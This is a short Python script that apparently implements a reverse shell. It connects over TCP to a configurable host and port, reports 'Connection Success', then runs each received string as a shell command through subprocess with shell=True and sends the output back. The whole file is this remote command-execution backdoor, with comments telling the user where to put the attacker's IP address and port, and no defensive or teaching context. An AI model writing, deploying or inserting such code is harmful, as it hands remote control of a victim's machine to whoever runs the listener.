import socket
import subprocess

def command_execution(command):
	return subprocess.check_output(command, shell=True) # Command as String
	
my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

my_connection.connect(("0.0.0.0",8080)) # Host IP adress and desired port (default : 8080).

my_connection.send("Connection Success\n")

while True :
	
	command = my_connection.recv(1024) # Recieve (1024 Bytes of data as default)
	command_output=command_execution(command)
	if command == "close":
		my_connection.close()
	my_connection.send(command_output)
